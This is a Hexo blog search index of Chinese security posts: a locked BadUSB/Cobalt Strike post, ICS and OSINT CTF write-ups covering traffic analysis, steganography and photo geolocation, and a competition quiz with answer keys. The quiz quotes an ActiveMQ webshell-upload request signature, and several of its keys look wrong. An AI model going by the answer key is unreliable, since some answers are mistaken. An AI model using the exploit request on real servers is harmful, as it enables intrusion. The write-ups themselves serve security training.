<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BadUSB配合CS免杀实现上线</title>
      <link href="2021/10/09/badusb/"/>
      <url>2021/10/09/badusb/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5771384430216c2a2f1ae5306cc46137119e128acd1ae9b73a2f941374a81d4b"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> badusb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工控CTF-纵横网络靶场社区</title>
      <link href="2021/10/07/gongkongxilie/"/>
      <url>2021/10/07/gongkongxilie/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间省工控被暴打了就想着学习一下工控知识，于是发现了一个很nice的纯工控靶场：<a href="https://game.fengtaisec.com/#/dashboard"><strong>纵横网络靶场社区</strong></a><br>工控小白在这记录一下（咕了很长一段时间，预计后续还灰咕咕咕</p><h2 id="解题记录"><a href="#解题记录" class="headerlink" title="解题记录"></a>解题记录</h2><h3 id="Modbus协议"><a href="#Modbus协议" class="headerlink" title="Modbus协议"></a>Modbus协议</h3><blockquote><p>黑客通过外网进入一家工厂的控制网络，之后对工控网络中的操作员站系统进行了攻击，最终通过工控协议破坏了正常的业务。我们得到了操作员站在攻击前后的网络流量数据包，我们需要分析流量中的蛛丝马迹，找到FLAG,flag形式为 flag{}</p></blockquote><p>考察modbus协议，过滤后发现有个长度最突出的包，进而发现一串可疑字符串得到flag：flag{TheModbusProtocolIsFunny!}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/gongkong1.png"></p><h3 id="MMS协议分析"><a href="#MMS协议分析" class="headerlink" title="MMS协议分析"></a>MMS协议分析</h3><blockquote><p>工业网络中存在的异常，尝试通过分析PACP流量包，分析出流量数据中的异常点，并拿到FLAG，flag形式为 flag{}。</p></blockquote><p>在MMS包下查找一番并没发现什么可疑的信息，然后追踪tcp流发现一张base64编码的图片</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/gongkong2.png"></p><p>base64转图片后即可得到flag：flag{ICS-mms104}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/gongkong3.png"></p><h3 id="大工UDP协议"><a href="#大工UDP协议" class="headerlink" title="大工UDP协议"></a>大工UDP协议</h3><blockquote><p>在进行工业企业检查评估工作中，发现了疑似感染恶意软件的上位机。现已提取出上位机通信流量，尝试分析出异常点，获取FLAG，flag形式为 flag{}。</p></blockquote><p>追踪UDP流发现可疑字符串</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/gongkong4.png"></p><p>hex解码得到flag：flag{7FoM2StkhePz}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/gongkong5.png"></p><h3 id="工控蜜罐日志分析"><a href="#工控蜜罐日志分析" class="headerlink" title="工控蜜罐日志分析"></a>工控蜜罐日志分析</h3><blockquote><p>工控安全分析人员在互联网上部署了工控仿真蜜罐，通过蜜罐可抓取并分析互联网上针对工业资产的扫描行为，将存在高危扫描行为的IP加入防火墙黑名单可有效减少工业企业对于互联网的攻击面。分析出日志中针对西门子私有通信协议扫描最多的IP，分析该扫描组织,Flag为该IP的域名,，flag形式为 flag{}。</p></blockquote><p>虽然不知道怎么才能找到针对西门子私有通信协议扫描最多的IP，但是不难看出来出现最多的IP就是139.162.99.243，于是尝试将其反查域名提交竟然真的是正确的flag：flag{scan-42.security.ipip.net}</p><p>（蹲个工控大佬👴教教这题正解是咋搞的呀~</p><h3 id="隐信道数据安全分析"><a href="#隐信道数据安全分析" class="headerlink" title="隐信道数据安全分析"></a>隐信道数据安全分析</h3><blockquote><p>安全分析人员截获间谍发的秘密邮件，该邮件只有一个MP3文件，安全人员怀疑间谍通过某种private的方式将信息传递出去，尝试分析该文件，获取藏在文件中的数据？flag形式为 flag{}。</p></blockquote><p>（震惊！工控竟然还有音频题.jpg</p><p>尝试了一番音频隐写无果，最后还是010看看它的文件结构，根据题目关键词 <code>某种private的方式</code> 我们找到 <code>struct MPEG_FRAME mf[] - struct MPEG_HEADER mpeg_hdr - uint32 private_bit</code> ，将其每八个为一组，转十进制再转ASCII码，得到flag：flag{pr1v4t3_bi7}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/gongkong6.png"></p><h3 id="工控安全取证"><a href="#工控安全取证" class="headerlink" title="工控安全取证"></a>工控安全取证</h3><blockquote><p>有黑客入侵工控设备后在内网发起了大量扫描，而且扫描次数不止一次。 请分析日志，指出对方第4次发起扫描时的数据包的编号，flag形式为 flag{} </p></blockquote><p>010查看可发现它是个pcap文件，于是我们直接用wireshark打开，很明显可以看出来主要就是 <code>192.168.0.9</code> 在攻击 <code>192.168.0.99</code> ，然后根据题目我们就先将其按时间显示格式来观察</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/gongkong7.png"></p><p>但由于它这时间都是很接近的，于是我们再根据协议来排发现ICMP协议正好是四次，进而得到数据包的编号为155990（but最后的flag却是flag{155989}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/gongkong8.png"></p><p>属实也没整太懂，<a href="https://blog.csdn.net/mochu7777777/article/details/120300941"><strong>那就附上其他师傅的wp</strong></a></p><h3 id="隐藏的黑客"><a href="#隐藏的黑客" class="headerlink" title="隐藏的黑客"></a>隐藏的黑客</h3><blockquote><p>根据情报得知工控现场发现某SCADA系统被黑客攻破,附件为黑客在目录留下的文件和当时时间段捕获到的一部分流量包,你能根据这些信息分析出蛛丝马迹来么flag形式为 flag{}。</p></blockquote><p>首先我们可以看出在 <code>upload</code> 的文件夹下全是 <code>webshell</code>，然后我们分析流量包也在http流下发现<code>webshell.zip</code> </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/gongkong9.png"></p><p>于是我们将其提取出来…</p><h2 id="佛系摸鱼🐟ing"><a href="#佛系摸鱼🐟ing" class="headerlink" title="佛系摸鱼🐟ing"></a>佛系摸鱼🐟ing</h2>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-osint</title>
      <link href="2021/09/27/ctfshow-osint/"/>
      <url>2021/09/27/ctfshow-osint/</url>
      
        <content type="html"><![CDATA[<h2 id="新手上路"><a href="#新手上路" class="headerlink" title="新手上路"></a>新手上路</h2><blockquote><p>提交图片上桥的名字即可，格式ctfshow{桥的名字}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-1.jpg"></p></blockquote><p>直接Google搜图得到信息：该地区位于蜈支洲島</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-001.png"></p><p>最后搜索附近的经典桥即可得到flag：ctfshow{情人桥}</p><p><img src="https://github.com/MssnHarvey/image/blob/main/ctfshow-osint-002.png?raw=true"></p><h2 id="初学乍练"><a href="#初学乍练" class="headerlink" title="初学乍练"></a>初学乍练</h2><blockquote><p>提交这架飞机的目的地，格式为ctfshow{目的地}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-2.jpg"></p></blockquote><p>图中关键信息：瑞士国旗，通过搜索得知也就5个机场，一个个试过去即可得到flag：ctfshow{苏黎世}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-003.png"></p><p>不过这样试过去就很丢人，我们还是需要确认下来：通过百度识图找到<a href="https://www.xhaiwai.com/news/15020.htm"><strong>相关文章</strong></a>最终确认此为苏黎世机场</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-004.png"></p><h2 id="初学又练"><a href="#初学又练" class="headerlink" title="初学又练"></a>初学又练</h2><blockquote><p>flag格式为 ctfshow{纬度(精确到小数点后四位, 不用进位),经度(精确到小数点后四位, 不用进位)} 例如 若找到的经纬度为( 11.45149,19.19810) 则flag为ctfshow{11.4514,19.1981}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-3.png"></p></blockquote><p>图中看到一家名为SandwichNSmoothies的三文治店，通过谷歌地图精准找到该位置并精准确认经纬度得到flag：ctfshow{55.6382,12.6411}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-005.png"></p><h2 id="初学再练"><a href="#初学再练" class="headerlink" title="初学再练"></a>初学再练</h2><blockquote><p>提交照片上所在军事基地的名称 提交ctfshow{军事基地英文}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-4.jpg"></p></blockquote><p>直接谷歌搜图查找得到此为俄罗斯 · Nagurskoye空军基地，进而得到flag：ctfshow{Nagurskoye}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-006.png"></p><h2 id="现拉现吃"><a href="#现拉现吃" class="headerlink" title="现拉现吃"></a>现拉现吃</h2><blockquote><p>提交图中店铺全名的拼音（无分隔符和声调、字母全小写）加食物价格（阿拉伯数字）即可， 例如：ctfshow{zhouzilamian114514}。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-5.png"></p></blockquote><p>百度识图发现相似图片，进而得知这家店是云峰清真餐厅(南滨河路店)</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-007.png"></p><p>然后搜索该店牛肉面价格得知一碗牛肉面10块钱，最终得到flag：ctfshow{yunfengqingzhencantingnanbinheludian10}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-008.png"></p><p>提交不对，回头仔细再看一下发现店名是云峰牛肉面，得到flag：ctfshow{yunfengniuroumian10}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-009.png"></p><p>woc还是不对，再查一下发现他应该是加个份牛肉，最后的价格应该是10+7=17，得到flag：ctfshow{yunfengniuroumian17}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-010.png"></p><h2 id="初窥门径"><a href="#初窥门径" class="headerlink" title="初窥门径"></a>初窥门径</h2><blockquote><p>拍摄者后面的建筑名称，格式ctfshow{建筑名称中文}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-6.jpg"></p></blockquote><p>通过yandex识图并进行局部特征识别锁定此为开罗 - 千塔之城，进而得到flag：ctfshow{胡夫金字塔}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-011.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021年中国工业互联网安全大赛(福建省选拔赛) 暨首届福建省工业互联网创新大赛</title>
      <link href="2021/09/09/2021gongkong/"/>
      <url>2021/09/09/2021gongkong/</url>
      
        <content type="html"><![CDATA[<h1 id="理论"><a href="#理论" class="headerlink" title="理论"></a><strong>理论</strong></h1><h2 id="单选题"><a href="#单选题" class="headerlink" title="单选题"></a><strong>单选题</strong></h2><p>ip地址分为全球地址（公有地址）和专用地址（私有地址），在文档rfc1918中，不属于专用地址的是 （D ）。</p><p>A 172. 16. 0. 0 到 172. 31. 255. 255</p><p>B 10. 0. 0. 0 到 10. 255. 255. 255</p><p>C 192. 168. 0. 0 到 192. 168. 255. 255</p><p>D 255. 0. 0. 0 到 255. 255. 255. 255</p><p>在非对称加密算法中，涉及到的密钥个数是？（D）</p><p>A 三个以上</p><p>B 一个</p><p>C 三个</p><p>D 两个</p><p>相邻的路由器在满足一定条件时才能成为邻居，以下不属于必要条件的是（B）。</p><p>A 位于相同网段</p><p>B 相同型号</p><p>C 相同 Hello 间隔</p><p>D 位于相同区域</p><p>数据备份通常可分为完全备份、增量备份、差分备份和渐进式备份几种方式。其中将系统中所有选择的数据对象进行一次全面的备份，而不管数据对象自上次备份之后是否修改过的备份方式是（ A ）。</p><p>A 完全备份</p><p>B 差分备份</p><p>C 渐进式备份</p><p>D 增量备份</p><p>你有一个共享文件夹，你将它的NTFS权限设置为sam用户可以修改，共享权限设置为sam用户可以读取，当sam从网络访问这个共享文件夹的时候，他有什么样的权限？（B）</p><p>A 写入</p><p>B 读取</p><p>C 修改</p><p>D 完全控制</p><p>VTP 修剪的命令是（C）。</p><p>A vtp brief</p><p>B vtp domain</p><p>C vtp pruning</p><p>D vtp status</p><p>在 P2DR2 安全模型中，“Rt”代表（A）。</p><p>A 系统做出响应所需时间</p><p>B 系统检测到攻击行为所需时间</p><p>C 安全体系建设所需时间</p><p>D 攻击成功所需时间</p><p>下列有关工业控制系统策略与过程的脆弱性描述有误的一项是：（A）</p><p>A 发生硬件或软件错误以及设备损毁时，功能安全产品起到必要的防护作用，不需要制定灾难恢复机制来应对；</p><p>B 不适当的配置或缺少特别适用于控制系统信息安全的策略通常导致工业控制系统的受到黑客攻击；</p><p>C 必须为工业控制系统开发专用的、总体性的信息安全流程，该流程是其他所有信息安全措施的基础；</p><p>D 控制系统工程师一般缺乏信息安全方面的专业培训，不可能维护安全可靠的工业控制系统；</p><p>身份认证是证实客户的真实身份与其所声称的身份是否相符的验证过程。目前，计算机及网络系统中常用的身份认证技术主要有：用户名/密码方式、智能卡认证、动态口令、生物特征认证等。其中能用于身份认证的生物特征必须具有（C ）。</p><p>A 稳定性和完整性</p><p>B 保密性和完整性</p><p>C 唯一性和稳定性</p><p>D 唯一性和保密性</p><p>设置了交换机端口安全时，违反规则后的处理策略不包括以下哪一条（B）。</p><p>A shutdown</p><p>B restart</p><p>C protect</p><p>D restrict</p><p>入侵检测对网络、系统运行状态进行监视，在发现入侵后及时作出相应，不包括下列哪个（A）。</p><p>A 复原变更文件</p><p>B 报警</p><p>C 切断网络连接</p><p>D 记录事件</p><p>MD5 密文认证的时候，密码最多支持为（D）个字符。</p><p>A 64</p><p>B 8</p><p>C 32</p><p>D 16</p><p>电子邮件系统的邮件协议有发送协议smtp和接收协议p0p3/imap4。smtp发送协议中，发送身份标识的指令是（A ）。</p><p>A helo</p><p>B help</p><p>C send</p><p>D saml</p><p>假设使用一种加密算法，它的加密方法很简单：将每一个字母加 5，即 a加密成 f。这种算法的密钥就是 5，那么它属于（B ）</p><p>A 单项函数密码技术</p><p>B 对称加密技术</p><p>C 分组加密技术</p><p>D 公钥加密技术</p><p>下列关于工业SCADA系统信息安全基础技术错误的是：（D）。</p><p>A 防火墙使用和二次编程开发都不太方便</p><p>B 审计日志使用方便，但不支持二次编程开发</p><p>C 生物特征因子使用方便，但不支持二次编程开发</p><p>D 入侵检测系统使用和二次编程开发都很方便</p><p>含有两个密钥的3重des加密： ,其中k1≠k2，则其有效的密钥长度为（ B）。</p><p>A 56 位</p><p>B 112 位</p><p>C 168 位</p><p>D 128 位</p><p>无线局域网鉴别和保密体系wapi是一种安全协议，也是我国无线局域网安全强制性标准，以下关于wapi的描述中，正确的是（D ）。</p><p>A wapi从应用模式上分为单点式、分布式和集中式</p><p>B wapi中，wpi采用rsa算法进行加解密操作</p><p>C wapi与wifi认证方式类似，均采用单向加密的认证技术</p><p>D wapi系统中，鉴权服务器as负责证书的颁发、验证和撤销</p><p>人为的安全威胁包括主动攻击和被动攻击。主动攻击是攻击者主动对信息系统实施攻击，导致信息或系统功能改变。被动攻击不会导致系统信息的篡改，系统操作与状态不会改变。以下属于被动攻击的是 （B ）。</p><p>A 伪装</p><p>B 嗅探</p><p>C 重放攻击</p><p>D 越权访问</p><p>在入侵检测的基础上，锁定涉嫌非法使用的用户，并限制和禁止该用户的使用。这种访问安全控制是？（B）</p><p>A 权限控制</p><p>B 网络检测控制</p><p>C 防火墙控制</p><p>D 入网访问控制</p><p>移位密码的加密对象为英文字母，移位密码采用对明文消息的每一个英文字母向前推移固定化y位的方式实现加密。设key=3，则对应明文math的密文为(D )。</p><p>A qexl</p><p>B rfym</p><p>C ocvj</p><p>D pdwk</p><p>为了达到信息安全的目标，各种信息安全技术的使用必须遵守一些基本原则，其中在信息系统中，应该对所有权限进行适当地划分，使每个授权主体只能拥有其中的一部分权限，使它们之间相互制约、相互监督，共同保证信息系统安全的是 （B ）。</p><p>A 纵深防御原则</p><p>B 最小化原则</p><p>C 分权制衡原则</p><p>D 安全隔离原原则</p><p>无论是哪一种web服务器，都会受到http协议本身安全问题的困扰，这样的信息系统安全漏洞属于（C ）。</p><p>A 开发型漏洞</p><p>B 验证型漏洞</p><p>C 运行型漏洞</p><p>D 设计型漏洞</p><p>为了防止一些漏洞（例如跨站脚本），需要对一些特殊字符进行HTML编码，例如：对特殊字符&amp;进行 HTML 转码后为（A）</p><p>A &amp;</p><p>B &lt;</p><p>C &gt;</p><p>D “</p><p>由于攻击者可以借助某种手段，避开 DBMS以及应用程序而直接进入系统访问数据，我们通常采取以下哪种方式来防范？( A )</p><p>A 数据库加密</p><p>B 使用集合法</p><p>C 修改数据库用户的密码，将之改得更为复杂</p><p>D 使用修改查询法，使用户在查询数据库时需要满足更多的条件</p><p>pki是一种标准的公钥密码密钥管理平台。在pki中，认证中心ca是整个pki体系中各方都承认的一个值得信赖的、公正的第三方机构。ca的功能不包括（D ）。</p><p>A 证书的备份</p><p>B 证书的审批</p><p>C 证书的颁发</p><p>D 证书的加密</p><p>在 IPSec中，（B ）是两个通信实体经过协调建立起来的一种协定，觉得用来保护数据包安全的 IPSec协议、密码算法、密钥等信息。</p><p>A ESP</p><p>B SA</p><p>C SP</p><p>D SPI</p><p>下面哪类访问控制模型是基于安全标签实现的？（D）</p><p>A 基于身份的访问控制</p><p>B 自主访问控制</p><p>C 基于规则的访问控制</p><p>D 强制访问控制</p><p>已知BX=2000H，SI=1234H，则指令MOV AX，[BX+SI+2]的源操作在 （ D ）中</p><p>A 附加段中偏移量为3236H的字节</p><p>B 数据段中偏移量为3234H的字节</p><p>C 附加段中偏移量为3234H的字节</p><p>D 数据段中偏移量为3236H的字节</p><p>AO和AI分别表示（C）正确答案</p><p>A 模拟量输出和数字量输入</p><p>B 数字量输出和数字量输入</p><p>C 模拟量输出和模拟量输入</p><p>D 模拟量输出和数字量输出</p><p>Profibus的通信参考模型中不包括下面那一项（D）</p><p>A 数据链路层</p><p>B 物理层</p><p>C 应用层</p><p>D 网络层</p><p>下列哪些行为不能加固SCADA系统：（C）</p><p>A 卸载不必要的软件</p><p>B 断开未认证的访问接口</p><p>C 不能通过端口扫描对系统环境进行测试</p><p>D 禁止不使用的端口</p><p>ipsec协议可以为数据传输提供数据源验证、无连接数据完整性、数据机密性、抗重播等安全服务。其实现用户认证采用的协议是（ D ）。</p><p>A esp协议</p><p>B skip协议</p><p>C ike协议</p><p>D ah协议</p><p>snort是一款开源的网络入侵检测系统，它能够执行实时流量分析和ip协议网络的数据包记录。以下不属于snort配置模式的是（ B ）。</p><p>A 包记录</p><p>B 分布式入侵检测</p><p>C 嗅探</p><p>D 网络入侵检测</p><p>apt攻击是一种以商业或者政治目的为前提的特定攻击，其中攻击者采用口令窃听、漏洞攻击等方式尝试进一步入侵组织内部的个人电脑和服务器，不断提升自己的权限，直至获得核心电脑和服务器控制权的过程被称为（ D ）。</p><p>A 横向渗透</p><p>B 防线突破</p><p>C 通道建立</p><p>D 情报收集</p><p>在信息系统上工作，保证安全的技术措施包括( B )。</p><p>A 授权，备份，测试</p><p>B 授权，备份，验证</p><p>C 授权，调试，验证</p><p>D 调试，备份，验证</p><p>基于md4和md5设计的s/key口令是一种一次性口令生成方案，它可以对访问者的身份与设备进行综合验证，该方案可以对抗（ C ）。</p><p>A 穷举攻击</p><p>B 网络钓鱼</p><p>C 重放攻击</p><p>D 数学分析攻击</p><p>在 RIP的 MD5认证报文中，经过加密的密钥是放在哪里的？（ B ）</p><p>A 报文头里</p><p>B 报文的第二个表项里</p><p>C 报文的第一个表项里</p><p>D 报文的第二个表项里</p><p>如果对一个密码体制的破译依赖于对某一个经过深入研究的数学难题的解决，就认为相应的密码体制是（ D ）的。</p><p>A 计算安全</p><p>B 绝对安全</p><p>C 无条件安全</p><p>D 可证明安全</p><p>CDP 数据包结构中主要不包括以下哪一个（A）。</p><p>A STP</p><p>B LLC</p><p>C DLC</p><p>D CDP</p><p>$HOME/.netrc文件包含下列哪种命令的自动登录信息？（D）</p><p>A rlogin</p><p>B rsh</p><p>C ssh</p><p>D ftp</p><p>工业防火墙是防火墙是建立在可信任、安全的内部网络和不安全或不被信任的外部网络之间的一个电子栅栏，工业防火墙技术是一种（B）安全模型</p><p>A 以上都不是</p><p>B 被动式</p><p>C 主动式</p><p>D 混合式</p><p>请求片段：MOVE /fileserver/shell.jsp，是以下哪个服务漏洞的典型利用特征？（C）</p><p>A nginx</p><p>B apache</p><p>C activemq</p><p>D IIS</p><p>IDS和IPS设备检查网络数据包中的恶意代码标志或漏洞利用程序的特征量，下列有关IDS和IPS 配置策略有误的是：（A）</p><p>A IDS和IPS设备不能识别工业控制系统网络协议关键功能代码；</p><p>B IDS和IPS设备告警任何针对工业控制系统网络的端口扫描；</p><p>C IPS设备应阻止任何跨安全域边界的未定义的流量；</p><p>D IDS设备记录安全域内正常或合法活动，有助于合规性检测报告；</p><p>Radius协议包是采用 ( A )作为其传输模式的。</p><p>A UDP</p><p>B 以上两者均可</p><p>C 其他</p><p>D TCP</p><p>源 IP为 100.1.1.1，目的 IP为 100.1.1.255，这个报文属于什么攻击？（ D ）（假设该网段掩码为 255.255.255.0）</p><p>A FRAGGLE攻击</p><p>B WINNUKE攻击</p><p>C LAND攻击</p><p>D SMURF攻击</p><p>外部渗透团队正在给客户的网络实施渗透测试。测试团队只能根据从Web上获取的信息来实施攻击。客户网络的员工知道将要进行测试，但渗透测试团队只能使用公开获得的信息和一些客户给的信息。测试团队认识的程度和测试的类型是什么？（D）</p><p>A 零了解；目标测试</p><p>B 部分了解；双盲测</p><p>C 完全了解；盲测</p><p>D 部分了解；盲测</p><p>下列说法不属于工业控制系统硬件脆弱性的是：（D）</p><p>A 工业控制系统中的关键部位没有安装备用电源，系统的掉电事故将关闭整个工业控制系统并可能触发进入不安全状态，系统掉电事故还可能引起系统恢复不安全的缺省配置；</p><p>B 控制系统中的硬件存在无线电频率和电磁脉冲方面的脆弱性，可以引发控制指令的短暂中断，甚至导致电路板的永久破坏；</p><p>C 缺少对关键部件的冗余备份，将使单点故障引发整个系统瘫痪；</p><p>D 长期未升级打补丁的操作系统和应用程序，可能隐藏新的、未被发现且极易造成破坏的脆弱性，需对工业控制系统信息安全补丁操作及维护过程制定规范；</p><p>对于自动化扫描工具，一般需要登录后进行检测，以获得更多的结果，下列认证方式错误的是？（B）</p><p>A 使用录入功能录入用户名密码</p><p>B 复制存活页面的url并进行配置代理</p><p>C 在工具中直接输入用户名密码</p><p>D 复制存活页面的cookies并配置代理</p><p>外部网关协议bgp是不同自治系统的路由器之间交换路由信息的协议，bgp-4使用四种报文:打开报文、更新报文、保活报文和通知报文。其中用来确认打开报文和周期性地证实邻站关系的是（C ）。</p><p>A 更新报文</p><p>B 通知报文</p><p>C 保活报文</p><p>D 打开报文</p><p>对称加密又称为（D）或单密钥加密。</p><p>A 特殊密钥加密</p><p>B 密钥加密</p><p>C 简单密钥加密</p><p>D 常规加密</p><p>IDS入侵检测系统一般有几种类型。哪种类型建立了一个场景中正常行为的概况，并根据这个给出一个数据包的异常值。（A）</p><p>A 基于统计异常的</p><p>B 基于状态的</p><p>C 误用检测系统</p><p>D 基于协议特征</p><p>pdr模型是一种体现主动防御思想的网络安全模型，该模型中d表示（ A ）。</p><p>A detection（检测）</p><p>B defense（防御）</p><p>C defend（保护）</p><p>D design（设计）</p><p>对使用堡垒主机区域时，下列对于配置防火墙规则错误的是：（D）</p><p>A 只允许通过必要的服务和通信</p><p>B 从源地址、目的地址、服务和端口进行限制</p><p>C 禁止从内部流量到控制系统的连接</p><p>D 允许穿越堡垒主机，对控制网络的访问</p><p>SQL注入攻击可通过何种方式进行防护（ D ）</p><p>A 购买硬件防火墙，并只开放特定端口</p><p>B 将密码设置为12位的特别复杂密码</p><p>C 安装最新的系统补丁</p><p>D 使用web应用防火墙进行防护</p><p>在传输模式 IPSec应用情况中，以下哪个区域数据报文可受到加密安全保护？（B）</p><p>A 新 IP头</p><p>B 传输层及上层数据报文</p><p>C 整个数据报文</p><p>D 原 IP头</p><p>下列关于EFS说法错误的是（ A ）</p><p>A EFS加密后的文件不可删除</p><p>B EFS加密文件系统只在NTFS分区下有效</p><p>C EFS加密后的文件可删除</p><p>D EFS对文件有效,文件夹无效</p><p>工业控制系统网络和与之相连的其他的网络的缺陷、错误配置或不完善的网络管理过程可能导致工业控制系统的脆弱性，下列描述错误的是：（B）</p><p>A 使用出厂设备的缺省配置通常导致开放不安全、不必要的端口，并暴露出主机上可被利用的服务。</p><p>B 工业控制系统中的基础设施网络环境经常随着运行的需求改变而不断修改和完善，不用担心考虑这些变化对系统的潜在的安全方面的影响。</p><p>C 不安全的通用串行总线（USB）和PS/2端口均可以允许非授权连接外围设备；</p><p>D 很多工业控制系统专用协议中没有完整性校验机制，为了确保完整性，工业控制系统可以使用较低层次的协议(如IPsec)为数据提供完整性保护能力</p><p>ICMP 协议的目的是（A）。</p><p>A 发送控制消息，提供通信环境的问题反馈</p><p>B 在主机间建立连接，提供可靠数 据传输</p><p>C 快速发送数据包，不追求数据可靠性</p><p>D 定位目的主机，寻找合适的传输路 径</p><p>什么方式能够从远程绕过防火墙去入侵一个网络？（A）</p><p>A Modem banks</p><p>B Identified network topology</p><p>C Active ports</p><p>D IP services_</p><p>以下各种加密算法中属于双钥制加密算法的是（ B ）</p><p>A Vigenere算法加密</p><p>B Diffe-Hellman加密</p><p>C Caesar替代法</p><p>D DES加密算法</p><p>针对特定工业系统目标的进行长时间持续性的网络攻击被称为（D）</p><p>A CC</p><p>B DDOS</p><p>C LTMT</p><p>D APT</p><p>关于《工业控制系统信息安全防护指南》，描述错误的是：（D）</p><p>A 由工业和信息化部印发</p><p>B 重点指导工业企业开展安全防护活动</p><p>C 注重防护要求的可执行性，从管理、技术两方面明确工业企业工控安全防护要求</p><p>D 主要涉及工控系统功能安全</p><p>metasploit中，搜索cve2019-0708的指令是（C）？</p><p>A show cve 2019-0708</p><p>B find cve2019-0708</p><p>C search cve:2019-0708</p><p>D search cve2019-0708</p><p>在 DES 中，数据以（D）比特分组进行加密。</p><p>A 128</p><p>B 32</p><p>C 16</p><p>D 64</p><p>已知des算法s盒如下:</p><p>如果该s盒的输入110011,则其二进制输出为( B )。</p><p>A 1001</p><p>B 1110</p><p>C 0100</p><p>D 0101</p><p>防火墙的安全规则由匹配条件和处理方式两部分组成。当网络流量与当前的规则匹配时，就必须采用规则中的处理方式进行处理。其中，拒绝数据包或信息通过，并且通 知信息源该信息被禁止的处理方式是（ D ）。</p><p>A accept</p><p>B drop</p><p>C refuse</p><p>D reject</p><p>明文认证的时候，密码最多支持（A）个字符。</p><p>A 8</p><p>B 64</p><p>C 32</p><p>D 16</p><p>蜜罐技术本质上是一种对攻击方进行欺骗的技术，通过布置一些作为诱饵的主机、网络服务或者信息，诱使攻击方对它们实施攻击，从而可以对攻击行为进行捕获和分析，下列哪一个是工控蜜罐：（D）</p><p>A Beeswarm；</p><p>B shhipot；</p><p>C T-Pot；</p><p>D Conpot；</p><p>Linux中，向系统中某个特定用户发送信息，用什么命令？（B）</p><p>A wall</p><p>B write</p><p>C net send</p><p>D mesg</p><p>ssl协议（安全套接层协议）是netscape公司推出的一种安全通信协议，以下服务中，ssl协议不能提供的是（ B ）。</p><p>A 用户和服务器的合法性认证服务</p><p>B 基于udp应用的安全保护</p><p>C 维护数据的完整性</p><p>D 加密数据服务以隐藏被传输的数据</p><p>用一个特别打造的SYN数据包，它的原地址和目标地址都被设置成某一个服务器地址。这样将导致接收服务器向他自己的地址发送SYN-ACK信息，结果这个地址又发回ACK信息并创建一个空连接，被攻击的服务器每接收到一个这样的连接就将其保存，直到超时，这种拒绝服务攻击是下列中的（B）。</p><p>A SYN Flooding 攻击</p><p>B Land攻击</p><p>C UDP Storm 攻击</p><p>D Teardrop 攻击</p><p>交换机的地址学习是采用 MAC 地址表来存储 MAC 地址与（C）的映射关系实现的。</p><p>A 硬件插槽</p><p>B LLC 地址</p><p>C 端口</p><p>D IP 地址</p><p>工控协议缺乏保密和验证机制，特别缺乏验证一个主站和从站之间发送的消息的完整性技术，下面攻击不属于利用工业协议脆弱性的是：（B）</p><p>A 攻击者重复发送合法的工业工控系统消息，并将它们发送到从站设备，从而造成设备损毁、过程关闭等破坏；</p><p>B 外部人员非法访问网络设备将导致工业控制系统设备硬件和敏感数据遗失；</p><p>C 向RTU发送无意义的信息，消耗控制网络的处理器资源和带宽资源；</p><p>D 向控制操作人员发送虚假的、欺骗信息，导致操作中心不能正确了解生产控制现场的实际工况，诱使其执行错误操作；</p><p>如果希望本交换机上对 vlan 所做的创建、删除、修改，被管理域中其他交换机同步， 则应该设置本交换机为（B）模式。</p><p>A 非透明</p><p>B 服务器</p><p>C 透明</p><p>D 